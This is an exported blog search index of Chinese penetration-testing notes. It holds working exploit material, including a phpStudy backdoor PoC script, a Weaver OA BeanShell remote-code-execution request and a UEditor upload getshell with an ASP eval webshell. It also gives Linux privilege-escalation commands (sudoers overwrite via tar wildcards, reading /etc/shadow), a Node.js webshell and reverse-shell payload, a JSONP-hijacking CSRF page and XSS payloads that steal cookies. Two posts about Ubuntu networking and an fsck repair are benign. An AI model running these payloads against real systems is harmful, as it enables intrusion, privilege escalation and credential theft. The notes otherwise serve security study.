<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[phpstudy后门漏洞利用]]></title>
    <url>%2Fphpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[0x00 前言Phpstudy是国内的一款免费的PHP调试环境的程序集成包，其通过集成Apache、PHP、MySQL、phpMyAdmin不同版本软件于一身，一次性安装无需配置即可直接使用，具有PHP环境调试和PHP开发功能。对我这种小白来说简直就是一大神器，但就是这样一个伴随了我多达三年之久的神器，突然爆出被恶意植入远控后门，不多说，含泪测试一下自己。 0x01 后门利用 poc 123456789101112131415161718192021222324252627282930313233# -*-coding:utf-8 -*-import requests import sys import base64def Poc(ip,cmd): cmd = 'system('+cmd+');' poc = base64.b64encode(cmd) print(poc) #poc = "c3lzdGVtKCdjYWxjLmV4ZScpOw==" headers = &#123; "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Connection": "close", "Accept-Encoding": "gzip,deflate", "Accept-Charset": poc, "Upgrade-Insecure-Requests": "1", &#125; url = ip r = requests.get(url,headers=headers) if "Administrator" or "DefaultAccount" or "Guest" "hello phpstudy"in r.text: print("[+] phpstudy is vuluable") print(r.text.encode("utf-8")) else: print("[-] phpstudy is safe")if len(sys.argv) &lt; 3: print("python phpstudy.py http://127.0.0.1 cmd")else: Poc(sys.argv[1],sys.argv[2]) 0x02 后门检测附上pcat的一个检测脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556# -*- coding:utf8 -*-__author__='pcat@chamd5.org'__blog__='http://pcat.cc'import osimport stringimport reimport sysdef strings(file) : chars = string.printable[:94] shortestReturnChar = 4 regExp = '[%s]&#123;%d,&#125;' % (chars, shortestReturnChar) pattern = re.compile(regExp) with open(file, 'rb') as f: return pattern.findall(f.read())def grep(lines,pattern): for line in lines: if pattern in line: yield linedef pcheck(filename): # trojan feature trojan='@eval' # just check dll file if filename.endswith('.dll'): lines=strings(filename) try: grep(lines,trojan).next() except: return print '=== &#123;0&#125; ==='.format(filename) for line in grep(lines,trojan): print line passdef foo(php_path): # . stand for current directory for path, dirs, files in os.walk(php_path, topdown=False): for name in files: pcheck(os.path.join(path, name)) for name in dirs: pcheck(os.path.join(path, name)) passif __name__ == '__main__': if len(sys.argv) &lt; 2: print "python check.py F:\phpstudy\PHPTutorial\php" else: foo(sys.argv[1]) 0x03 修复建议 及时清除后门文件并作安全检查看是否被种下其他后门 更新至最新版本，毕竟phpstudy还是给我们带来了很多的便捷，不能因噎废食。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[泛微OA远程代码执行漏洞利用]]></title>
    <url>%2F%E6%B3%9B%E5%BE%AEOA%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[0x00 前言泛微OA远程代码执行漏洞，泛微e-cology OA系统的JAVA Beanshell接口可被未授权访问，攻击者调用该Beanshell接口，可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行。 影响版本：7.0 8.0 8.1 0x01 漏洞利用通过访问泛微协同办公系统weaver/bsh.servlet.BshServlet，可直接访问Beanshell接口执行任意命令,postbsh.script=exec(&quot;whoami&quot;);即可执行命令。 12345678910111213141516POST /weaver/bsh.servlet.BshServlet HTTP/1.1Host: zhengbao.wangContent-Length: 104Cache-Control: max-age=0Origin: https://zhengbao.wangUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Referer: http://zhengbao/weaver/bsh.servlet.BshServletAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: testBanCookie=test; JSESSIONID=abcNcyM2yAMSeaWQ-nS1wConnection: closebsh.script=exec%28%22whoami%22%29%3B%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A 0x02 修复方式升级到泛微OA最新版本或安装官方BSH补丁包https://www.weaver.com.cn/cs/securityDownload.asp]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BEA Weblogic Server ssrf漏洞利用]]></title>
    <url>%2FBEA-Weblogic-Server-ssrf%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[0x00 前言测试遇到了BEA Weblogic Server ssrf漏洞，记录一下。 0x01 ssrf内网端口探测探测内网主机 10.10.0.217 2222端口 1http://zhengbao.wang/uddiexplorer/SearchPublicRegistries.jsp?operator=http://10.10.0.217:2222&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search 端口开放回显did not have a valid SOAP content-type,如下图 探测1234端口，端口关闭回显could not connect over HTTP to server,如下图 根据回显不同，可做内网端口探测。 其他关于ssrf的利用，可参见博客文章 SSRF的一些利用姿势]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>ssrf</tag>
        <tag>weblogic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[UEditor .net版本任意文件上传]]></title>
    <url>%2FUEditor-net%E7%89%88%E6%9C%AC%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%2F</url>
    <content type="text"><![CDATA[0x00 前言今天在渗透过程中碰到了一个UEditor .net版本，刚好最近想更新下博客，记录一个getshell的过程。 0x01 UEditor .net版本任意文件上传这个任意文件上传是18年8月份爆出来的，漏洞的成因是在获取图片资源时仅检查了ContentType，导致可以绕过达到任意文件上传。 12345if (response.ContentType.IndexOf("image") == -1) &#123; State = "Url is not an image"; return this; &#125; 漏洞利用poc 1234&lt;form action="http://xx/ueditor/net/controller.ashx?action=catchimage" enctype="multipart/form-data" method="POST"&gt; &lt;p&gt;shell addr: &lt;input type="text" name="source[]" /&gt;&lt;/p&gt; &lt;input type="submit" value="Submit" /&gt;&lt;/form&gt; 然后在服务中构造绕过验证的一句话submit即可 因为这里只验证了contentType,所以可以在代码中伪造contentType,我所使用的为 1234&lt;?phpheader('Content-type: image/jpeg'); echo "&lt;% eval request(\"cmd\") %&gt;";?&gt; 我这里使用的是php文件，利用的时候可以采用poc.php?.asp的形式，这样上传后的文件就为asp文件了。 提交之后便会返回webshell路径 0x02 参考资料UEditor .net版本 getshell]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux提权姿势]]></title>
    <url>%2FLinux%E6%8F%90%E6%9D%83%E5%A7%BF%E5%8A%BF%2F</url>
    <content type="text"><![CDATA[0x00 前言本文是在阅读了in.security 提权靶场通关手册后学习的一点总结和记录，作为笔记供以后使用查阅。原文链接将附在文末。 0x01 信息收集获取到一个shell后，要进行一系列的信息收集，以获取更多的提权思路。 检测当前用户权限 whoami id 查看系统的发行版本和内核版本 lsb_release -a uname -a 查看suid文件 查看运行的服务及安装的程序 查看/etc/passwd文件及隐藏文件等 收集到的信息越多，越能找到更多的突破口。 0x02 提权方法sudo 提权sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具。普通用户可以通过sudo -l命令查看可以执行哪些命令。这样普通用户就可以在不知道root密码的情况下使用这些命令。因为用户使用sudo命令时需验证自己身份，因此这个方法需要知道普通用户的密码。 可以看到靶场bob用户可以使用awk curl man 等很多命令。 那么下面就这些命令展开利用，这里推荐一个在线查询工具：https://gtfobins.github.io/ sudo awk &#39;BEGIN {system(&quot;/bin/sh&quot;)}&#39; 这里借助awk直接获取到root权限 接下来用man试一下 12sudo man man!/bin/sh 利用script script -q /dev/null 利用curl读取root文件 curl file:///etc/shadow 其他的都可以通过上面的在线网站查找到利用方式，这里不一一例举了。 cronjobs 提权如果系统管理员设置了计划任务并以root权限运行，比如周期性的运行某一个脚本，如果普通有权限修改这个脚本的话，便可以执行任意命令造成权限提升。 此外还有一个Crontab Tar通配符注入，当计划任务中以root权限进行tar命令操作时，可以造成通配符注入进行权限提升。下面在靶场中进行展示。 查看/etc/crontab，可以看到每分钟执行了backup脚本 查看backup内容，进行了tar打包操作， 然后便可以进行提权操作了 123echo 'echo "ignite ALL=(root) NOPASSWD: ALL" &gt; /etc/sudoers' &gt;test.shecho "" &gt; "--checkpoint-action=exec=sh test.sh"echo "" &gt; --checkpoint=1 等一分钟后，待计划任务完成，使用sudo bash，便会提升至root权限。 那么在第一步说到的信息收集中，查看/etc/crontab也应该被列为信息收集的一步，说不定就会有意想不到的收获。 所以在设定计划任务时要注意一些问题： crontab任务千万不要写到/etc/crontab文件里。通过crontab -e去创建，让他写到默认的/var/spool/cron下； 尽量避免使用root 去创建，如果一定要用root，要注意设置权限。 SUID 提权suid是指二进制文件在执行时拥有其拥有者owner的权限，例如passwd命令 使用find / -user root -perm -4000 2&gt;/dev/null 或者find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \;查找所有owner为root且为suid的二进制文件 查看其中一个/usr/bin/taskset,在前面提到的在线网站GTFOBins查看命令 sudo taskset 1 /bin/sh直接获取到root权限 NFS 未授权nmap扫描一下nmap -T4 -sS -Pn 192.168.111.122 发现了2049端口开启的nfs服务，nfs，英文全称Network File System，即网络文件系统，是由SUN公司研制的UNIX表示层协议，能使使用者访问网络上别处的文件就像在使用自己的计算机一样。 这里使用两外一台机器对其进行访问。 首先showmount -e 192.168.111.122查看可以访问的目录。 将其挂载到本地进行查看 我们在挂载的/mnt/peter目录是没有写权限的，但是由于其所有者uid设定1001，所属组gid设定1005，所有只需要本地创建一个uid为1001，gid为1005的用户即可绕过其权限验证。 创建一个符合要求的用户后，即可执行写操作了。 生成新创建用户boogle的ssh公钥对和私钥对。 因为现在又对peter家目录的写权限，所以现在可以直接将上面的公钥对写入到peter的.ssh目录下，这样便可以直接使用ssh登陆获取peter用户的shell。 docker 组用户提权查看上面peter发现其属于docker组用户 docker组用户的权限还是非常大的，相当于root权限了。可以借助其提权到root权限。 思路参考：普通用户借助Docker容器提权思路分享。 还有一个具体的利用代码：https://github.com/chrisfosterelli/dockerrootplease docker run -v /:/hostOS -i -t chrisfosterelli/rootplease systemd 配置提权查看文件，并且peter用户有对其读写的权限。 修改其配置ExecStart指向我们自定义的二进制文件，其启动时便会以root用户执行这个文件。 创建一个systemdexpl.sh脚本，将/bin/bash文件复制到systemdbash并设置一个SUID位并且赋予执行权限 echo -e &#39;#!/bin/bash \ncp /bin/bash /home/peter/systemdbash \nchmod 6755 /home/peter/systemdbash&#39; &gt; /home/peter/systemdexpl.sh &amp;&amp; chmod +x systemdexpl.sh 重启之前便会生成systemdbash文件 复制前面的ssh公钥到root用户下 然后便可以直接ssh登陆到root 0x03 参考链接in.security 提权靶场通关手册上篇 in.security 提权靶场通关手册下篇]]></content>
      <categories>
        <category>后渗透</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu网络问题记录]]></title>
    <url>%2Fubuntu%E7%BD%91%E7%BB%9C%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[0x00 前言又遇到了ubuntu18.04的网络问题，这里记录一下，他日备用。 0x01 问题排查检查物理机服务如果是虚拟机，首先在物理机中查看服务，查看下面内容是否已经启动，没有则启动。 检查interfaces配置虚拟机配置为NAT模式，小图标显示网卡启动成功，但是使用ifconfig却看不到网卡信息。 执行命令if a，这里ens33网卡在ifconfig中并没有显示出来。（下图是配置好后截图） 然后编辑interfaces文件 sudo vi /etc/network/interfaces 这里并没有ens33配置信息，添加一下。 添加内容 12auto ens33iface INTERFACE inet dhcp 保存配置后重启网络/etc/init.d/networking restart 网络通畅。 检查netplan配置ubuntu18.04 LTS后使用netplan配置网络，此时当查看interfaces文件时会发现下面的提示。 这时要修改/etc/netplan/50-cloud-init.yaml文件 sudo netplan apply使配置生效。 防火墙问题此外还可能存在防火墙配置问题，比如ufw sudo ufw disable 0x02 其他问题如果后期遇到其他问题，将继续作补充。]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jsonp劫持漏洞]]></title>
    <url>%2Fjsonp%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[0x00 前言jsonp在跨域资源共享方面已存在了好多年，jsonp劫持技术也已被大佬们用烂了，本篇文章从介绍什么是jsonp开始，由浅入深介绍jsonp劫持漏洞产生的前因后果。重新拾一拾这个被遗忘在角落的漏洞。 0x01 何为jsonp所谓jsonp，其实是聪明的程序们为了克服同源策略实现跨域资源共享的一种方式,一经出现便得到广泛应用，逐渐成为一种非官方跨域数据交换协议。而它与json又有什么关系呢？准确来说关系不大，只不过json作为一种轻量级的数据交换格式，能够被多种语言直接使用，因此jsonp这种数据共享方式也使用了json格式来共享数据，即JSON with Padding。既然json只是一种数据交换格式，那么使用jsonp这种方式共享其他数据格式也是可以的，比如说直接用字符串。 0x02 为什么要使用jsonp既然json就能够直接被多种语言直接使用，为啥在进行数据交换时还得padding一下，变为jsonp呢？其实在上面就已经提到过了，jsonp并不是简单的为了数据交换，而是实现跨域资源共享。我们知道，因为同源策略的存在，致使资源不能跨域访问，这时如果想跨域进行资源访问，就可以使用jsonp这种方式了。 下面我们搭建一个简单的环境理解一下，json.json文件中保存要共享的资源，get_json.html用于获取资源 12//json.json&#123; username: "boogle", password: "zhengbao.wang" &#125; 1234567891011//get_json.html&lt;script src='http://libs.baidu.com/jquery/2.0.0/jquery.min.js'&gt;&lt;/script&gt;&lt;script &gt; $.ajax(&#123; url: 'http://192.168.111.132/json.json', type:"get", dataType: "json", success: function (data) &#123; console.log(data);&#125; &#125;)&lt;/script&gt; 在同源环境进行数据获取时，一切正常。 将get_json.html放在与json.json不同源的地方访问时，会出现报错 那为啥jsonp为啥能进行跨域资源访问呢？如果你足够仔细，便会发现在上面get_json.html代码的第一行，&lt;script&gt;标签中是引用了百度的jquery,但是这个http://libs.baidu.com与我们的数据完完全全是不同源的呀，为啥可以这样引用呢，这是因为&lt;script&gt;标签并不遵循同源策略，可以直接进行跨域资源访问。而聪明的程序员们也正是利用了这一点，实现了jsonp. 0x03 如何使用jsonp既然&lt;script&gt;标签可以跨域，那么便可以直接构造一个&lt;script&gt;标签进行跨域资源访问了 123456789//get_jsonp.html&lt;body&gt; &lt;script src='http://libs.baidu.com/jquery/2.0.0/jquery.min.js'&gt;&lt;/script&gt; &lt;script&gt; var s = document.createElement('script'); s.src = 'http://192.168.111.132/json.json'; document.body.appendChild(s); &lt;/script&gt;&lt;/body&gt; 访问之后却报错了。此时虽然报错，但是仔细观察一下，这时其实已经访问到跨域的json.json文件了，只不过该文件中的内容并不符合javascript代码规范，导致了报错。 此时只需将json.json中的内容按照代码规范去规定，便可以实现跨域资源访问。聪明的程序员们很快便找到了解决问题的办法。只需让目标页面回调本地页面的方法，并带入参数即可，这也就是jsonp的核心原理。 重新写一下get_jsonp.html和定义json.json的文件内容 12345678910111213//get_jsonp.html&lt;body&gt; &lt;script src='http://libs.baidu.com/jquery/2.0.0/jquery.min.js'&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; function callback(json) &#123; console.log(json); &#125; var s = document.createElement('script'); s.src = 'http://192.168.111.132/json.json'; document.body.appendChild(s); &lt;/script&gt;&lt;/body&gt; 在json.json中按照javascript代码规范调用callback函数，并将数据作为参数传入 12//json.jsoncallback(&#123; username: "boogle", password: "zhengbao.wang" &#125;) 成功实现跨域资源访问 0x04 jsonp劫持漏洞说到现在，jsonp在实现跨域资源访问这方面确实是一种不错的选择，可以说是广大程序员们智慧的结晶，但是任何事物都有两面性，jsonp也不例外。如果通过一些敏感的数据通过这种方式去传输，便很容易造成信息泄露，但这并不是jsonp引起的，因为即使使用json格式，去传输上面的类似的账号密码信息，攻击者一样可以通过直接访问获取到敏感数据。但是，因为jsonp实现了跨域资源访问，如果获取的数据能够成为下一步操作的凭证，那么便可以引起csrf，即jsonp劫持。 比如说，一个用户发表文章的操作，需要验证token防止csrf，而这个token的获取，确是通过jsonp这种方式，那么攻击者便可以在自己的网页实现跨域获取token，并让这个用户发表文章。此时只要用户点击这个页面，便会神不知鬼不觉的发表一篇文章，如果发表的文章中带有这个恶意页面链接，那么所有点击的人都会发送这样一篇文章，从而实现csrf蠕虫。而且由于jsonp跨域的操作，使得原本可以预防csrf的token形同虚设。 在乌云上一搜，可以看到许多大厂都有过jsonp劫持的案例 这里简单写一个演示demo去理解，为了方便，代码中涉及到的token等都被写死了。 模拟一个发表文章页面,只有在token正确的情况下才会发表，避免了csrf。 123456789101112131415161718192021222324&lt;?phpif(!empty($_POST['token']))&#123; $csrf_token = $_POST['token']; $title = $_POST['title']; $content = $_POST['content']; if ($csrf_token === 'NKJJDkajwdadwdad_csrf_token_test') &#123; echo '文章发表成功~'.'&lt;/br&gt;'; echo $title.'&lt;/br&gt;'; echo $content; &#125; else &#123; echo 'csrf token error'; &#125;&#125;else&#123; echo 'no token';&#125;?&gt; 跟之前一样，token被保存在json.json 1callback(&#123;"username":"boogle","password":"zhengbao.wang","token":"NKJJDkajwdadwdad_csrf_token_test"&#125;) 现在模拟黑客，写一个页面诱导用户点击 1234567891011121314151617181920212223//hello.html&lt;html&gt;&lt;head&gt;&lt;title&gt;test&lt;/title&gt;&lt;meta charset="utf-8"&gt;&lt;/head&gt;&lt;body&gt;&lt;form action="http://192.168.111.132/add.php" method="POST" id="csrfsend"&gt;&lt;input type="hidden" name="content" value="I can control you"&gt;&lt;input type="hidden" name="title" value="hello,jsonp"&gt;&lt;input type="hidden" id="token" name="token" value=""&gt;&lt;/form&gt;&lt;script type="text/javascript"&gt;function callback(obj)&#123; console.log(obj); var token = obj["token"]; document.getElementById("token").value = token; document.getElementById("csrfsend").submit();&#125;&lt;/script&gt;&lt;script type="text/javascript" src="http://192.168.111.132/json.json"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 此时攻击者将页面存放在自己的服务器http://192.168.111.1/hello.html，并诱导用户点击。 可以看到，token被获取到并成功验证，发表了一篇文章。 0x05 漏洞挖掘思路jsonp劫持漏洞的挖掘，可以借助于搜索引擎，使用Google Hacking语法针对目标站点进行关键词搜索。 比如 1site:zhengbao.wang inurl:callback 常见的关键词有 123456789101112callbackjsoncallbackjsonpcallbackjsoncalljsonpcallcbjsoncbjsonpcb=json=jsonp=jQuery....... 此外，还可以在对目标站点浏览器时，打开F12开发者工具，点击network窗口并勾选preserve log，查看请求记录并进行关键词筛选。 筛选的依据同样可以从上面的关键词中挑选 查找到后需要进行确认，判断其是否是真的jsonp方法，可通过跨域浏览实现，将前面的get_jsonp.html进行修改，&lt;script&gt;标签内的src改为目标url，将callback等关键词后面的回调函数名改为我们定义的函数名称。修改完后，放在我们的站点继续访问 能够获取到数据即可确定 当然，并不是所有的数据都是有用的，应重点关注一些敏感信息泄露及csrf token等，便于后续利用。 0x06 后记文中所提到的demo，为了简单，都已经写死了，但是真正的jsonp在使用起来可以变得更加复杂，包括可以获取动态的token值，可以使用动态的callback函数等，本文旨在对jsonp即jsonp劫持漏洞的扫盲，更多的操作可查阅详细的资料。 参考文章： https://m.php.cn/article/394158.html https://www.leavesongs.com/HTML/sina-jsonp-hijacking-csrf-worm.html]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>jsonp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[花式文件内容读取]]></title>
    <url>%2F%E8%8A%B1%E5%BC%8F%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E8%AF%BB%E5%8F%96%2F</url>
    <content type="text"><![CDATA[0x00 前言今天在客户机器上测试时发现cat命令被禁了，由此想到还有哪些命令可以用于读取文件内容。网上一搜，果然发现不少，特此记录一下。 0x01 常用文件内容读取命令按正常来说，常用的几个文件读取命令有cat head more less nl tail tailf tac 其中tailf 用于读取文件最后10行内容，一般用于读取最新的日志文件，也可以使用-n参数改变读取的行数。但这个命令在一些linux系统中并没有在装机时安装。 另外tac 命令跟cat相反，用于按行倒着输出文件内容。 此外，less命令用于分页显示，如果在远程命令执行漏洞环境下可能读取的内容并不能直接返回，此时可以echo `less flag.txt` 或者 less flag.txt |grep &#39;&#39; 除了直接读取外，一些内容编辑软件也可以用来读取文件内容，例如vi vim 0x02 花式文件内容读取命令除了常用的文件内容读取命令外，在搜索过程中发现了大佬们总结的其他花式文件内容读取命令:https://xz.aliyun.com/t/2281 static-sh paste diff diff命令用来比较两个文件的不同，所以后面应该跟两个参数 od od命令以8进制字码输出文件内容，可使用-a参数辅助查看输出内容 bzmore bzless 0x03 后记花式文件内容读取可能在平时并不会用到，但是在实际渗透过程中，如果环境中常用的文件读取命令被禁用，此时花式文件内容读取不失为一种优美的绕过姿势。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>bypass</tag>
        <tag>文件读取</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nodejs安全]]></title>
    <url>%2FNodejs%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[0x00 前言Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行环境。Node 是一个让 JavaScript 运行在服务端的开发平台，它让 JavaScript 成为与PHP、Python、Perl、Ruby 等服务端语言平起平坐的脚本语言。因为在之前并没有了解过nodejs的所产生的安全问题，本文将以node.js框架express为例，浅析nodejs安全问题。 0x01 环境搭建本次测试使用express框架，环境搭建很简单，只需新建一个工作目录，然后执行npm install expres –save,即可使用express。演示代码如下test.js1234567var express = require('express');var app = express();app.get('/', function(req, res) &#123; var resp=eval("("+req.query.input+")"); res.send('Output&lt;/br&gt;'+resp);&#125;);app.listen(8001); 然后执行node test.js即可在本地8001端口启动一个简单的web应用程序。 0x02 信息收集在渗透测试过程种，对目标的渗透必要要经过信息收集以获取更过的信息来定制下一步的行动计划。对Node.js应用的渗透也要经过信息收集，以确定目标是否使用了Node.js。收集过程中重点留意cookies， name[“connect.sid”]，server以及 X-powered-By 等头信息。如在前面搭建起的环境种，X-powered-By头暴露了目标使用express框架。此外，程序运行时意外的报错信息也能帮助获取更多的信息，当然，一个大型的项目很少会出现这种报错。但在上面的demo中，输入的input中带有一些特殊字符时将触发报错。在得知目标为Node.js应用后，便可以进行进一步的利用。 0x03 漏洞利用服务端代码执行在前面的demo中，通过get传入的参数未经任何过滤而直接进入到eval()函数中执行，此处便存在代码执行漏洞。下面是可以用于测试的一些payload 12345678910process.archprocess.argvprocess.argv0process.channelprocess.cwd()process.geteuid()process.getegid()process.pidprocess.platformprocess.version 甚至可以传入process.exit()终止程序的运行。 读取文件require(&#39;fs&#39;).readFileSync(&#39;test.js&#39;).toString() 获取webshell1setTimeout(function() &#123; require('http').createServer(function (req, res) &#123; res.writeHead(200, &#123;"Content-Type": "text/plain"&#125;);require('child_process').exec(require('url').parse(req.url, true).query['cmd'], function(e,s,st) &#123;res.end(s);&#125;); &#125;).listen(8003); &#125;, 3000) 这里传入setTimeout函数，三秒后在8003端口启动一个webshell。(延时时间最好大于1s，否则可能执行失败)成功执行命令，可以看到setTimeout也可以执行任意代码，所以会任何进入系统函数的用户输入都是不安全的，在测试过程不仅要注意eval函数，还要注意setTimeuut setInterval等系统函数。 获取反弹shellpayload1function rev(host,port)&#123;var net = require('net');var cp = require('child_process');var cmd = cp.spawn('cmd.exe', []);var client = new net.Socket();client.connect(port, host, function()&#123;client.write('Connected\r\n'); client.pipe(cmd.stdin); cmd.stdout.pipe(client);cmd.stderr.pipe(client);client.on('exit', function(code,signal)&#123; client.end('Disconnected\r\n'); &#125; );client.on( 'error',function(e)&#123; setTimeout( rev(host,port), 5000); &#125;)&#125;);&#125;;rev('127.0.0.1', 1234); 这里也可使用nodejsshell.py生成编码后的nodejs代码输入监听的ip 端口执行生成的payloadnc成功监听到返回的shell目标为Linux主机可以返回/bin/bash,windows下可以返回cmd.exe，可以在生成代码的第36行进行修改 远程命令执行Node.js的远程命令执行主要是由于没有正确使用child_process模块造成的，该模块可以创建一个新的进程进来执行系统命令。1234567891011121314var http = require("http");var url = require("url");var exe = require('child_process');http.createServer(function(request, response) &#123; var parsedUrl = url.parse(request.url, true); response.writeHead(200, &#123;"Content-Type": "text/html"&#125;); exe.exec('ping -c 2 ' + parsedUrl.query.ping, function (err, data) &#123; response.write("Hello "+ data); response.end(); &#125;); &#125;).listen(8888); 上面的demo中使用了child_process模块的exec函数来进行系统交互来执行ping命令。但是由于没有正确过滤传入的参数，从而造成任意系统命令执行。正常服务执行任意命令http://127.0.0.1:8888/?ping=www.baidu.com;||dir HTTP参数污染这是Node.js一个比较独特的特性，允许一个参数有多个值传入，当对一个参数传入多个值时，中间会以逗号,进行拼接。比如上面的demo中，我们传入两个ping值这个特性可能会引起参数解析漏洞或者在绕过waf时提供思路。 0x04 防护在给出的Node.js不安全的demo中，可以明显的看出，同其他语言一样，所有未加过滤的用输入都是不安全的，所以在开发过程中应时刻注意对用户输入做适当的处理，令附node.js安全开发的一些参考https://www.cnblogs.com/qingmingsang/articles/10397870.html 0x05 参考链接https://bbs.ichunqiu.com/thread-24807-1-1.htmlhttps://www.jianshu.com/p/8253adac33d8]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux run fsck failed问题解决办法]]></title>
    <url>%2FLinux-run-fsck-failed%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95%2F</url>
    <content type="text"><![CDATA[0x00 前言之前课程设计内容保存在reahat虚拟机里了，最近要进行答辩，打开虚拟机一看竟然启动失败。心咯噔一下，仔细看一下幸好不是大问题，仅此小记，以备不时之需。 0x01 问题从截图中可以看到启动失败的问题为RUN fsck manuplly failed看样子应该是硬盘出现了啥问题，导致开启时分区挂载不上，然后修复失败。 好在下面给了个手动修复的命令行，只要输入root password即可登陆 0x02 解决既然时自动修复失败，那么便手动修复一下试试。1fsck -y /dev/mapper/VolGroup-lv_root 这里/dev/mapper/VolGroup-lv_root修复路径为上面修复失败的路径修复后如下图，reboot重启应该就没啥问题了。]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>Linux错误</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS姿势学习]]></title>
    <url>%2FXSS%E5%A7%BF%E5%8A%BF%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[0x00 前言前段时间看到了无需括号和分号的XSS,最近又看了利用JavaScript全局变量绕过XSS过滤器,两篇均为译文，提出了一些非常有用的姿势，特此记录膜拜。另外文末贴有原文连接。 0x01 无需括号和分号的XSS早在几年前，作者就提到过在javascript中调用函数而无需括号的方法&lt;script&gt;onerror=alert;throw 1337&lt;/script&gt;该方法主要利用onerror和throw,工作原理是将onerror设置为你想调用的函数，然后用throw语句将参数传递给调用函数。在上面的payload中，因为throw是一个语句，在和onerror配合使用时需要用分号隔离，避免被包含。而语句隔离也可以使用花括号{}来实现:&lt;script&gt;{onerror=alert}throw 1337&lt;/script&gt;这样其实就已经达到作者标题所要的无需括号和分号的xss。但是作者并没有停止，很快又提出了一万种姿势。他发现throw语句可以接上一些表达式，那么这样就可以把onerror放在throw语句中进行赋值，并且throw表达式的最后一部分会被发送到onerror指定的处理函数中。1&lt;script&gt;throw onerror=alert,a='boogle',b='1337',a&lt;/script&gt; 如果想执行更复杂的语句，那么便可以使用eval函数，但是将上面的payload改为1&lt;script&gt;throw onerror=eval,alert`xss`&lt;/script&gt; 这里弹出的xss为一个字符串，可以使用破浪号包裹而不用括号，如果想要弹cookie，那么就要用到括号了1&lt;script&gt;throw onerror=eval,alert(document.cookie)&lt;/script&gt; 这种方式调用函数，那么显然还是需要()的。但是仔细观察前面的弹窗，我们传入内容为boogle,弹窗内容却为Uncaught boogle这样如果在传入的内容之前添加一个=,将会产生一个什么样的效果。对，神奇的事情发生了，就像表面添加=一样，可以将Uncaught赋值为后面的内容，成为一个变量，那么这个变量就可以传入eval函数执行任意javascript代码了。下面的payload中因为alert函数被引号包裹，可以将()编码为\x28\x29从而达到绕过效果。1&lt;script&gt;throw%20onerror=eval,"=alert\x28document.cookie\x29"&lt;/script&gt; 同样，前面的payload也可以这样变种,产生的效果及原理相同.1&lt;script&gt;&#123;onerror=eval&#125;throw'=alert\x281337\x29'&lt;/script&gt; 上面将Uncaught变为变量的方法是在chrome浏览器下实现的，而且在Microsoft Edge和IE下都能达到效果。但是当把这种方法拿到firefox浏览器时，却失败了，原因Firefox种报错前缀是uncaught exception:，代码最后执行赋值时会出现语法错误。 但是很快作者给出了在firefox上的任意javascript执行的方法1&lt;script&gt;&#123;onerror=eval&#125;throw&#123;lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'&#125;&lt;/script&gt;` 最终，作者更是贴出了一种无需字符串的通用payload 